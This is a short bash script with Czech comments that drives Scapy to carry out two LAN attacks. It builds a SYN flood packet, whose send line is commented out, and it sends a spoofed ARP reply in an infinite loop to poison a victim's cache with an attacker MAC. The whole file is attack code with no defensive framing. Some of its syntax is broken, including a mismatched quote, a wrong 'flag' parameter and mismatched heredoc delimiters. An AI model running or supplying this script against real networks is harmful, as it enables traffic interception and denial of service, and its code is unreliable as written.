#!/bin/bash -x

###### PARAMETRY #################
#1)SYN ATTACK PARAMETRY
SYN_DST_ADDRESS="192.168.1.1"
SYN_DST_PORT="80"
#2)ARP poissoning
VICTIM_MAC="00:00:00:00:00:00"
SPOOFED_SENDER_IP="192.168.1.1"
SPOOFED_IP="192.168.1.13"
ATTACKER_MAC="00:00:00:00:00:BE"

##################################
scapy << -EOF
#1)generovani paketu pro SYN
packetSYN=IP(dst="$SYN_DST_ADDRESS")/TCP(dport="$SYN_DST_PORT, flag="S")
#send(packetSYN,loop=1) #posilej paket v nekonecne smycce

#2)ARP poisoning
packetARP=Ether(dst="$VICTIM_MAC")/ARP(op="is-at",hwsrc="$ATTACKER_MAC",psrc="$SPOOFED_SENDER_IP",pdst="$SPOOFED_IP")
sendp(packetARP,loop=1) #posilej paket v nekonecne smycce

EOF
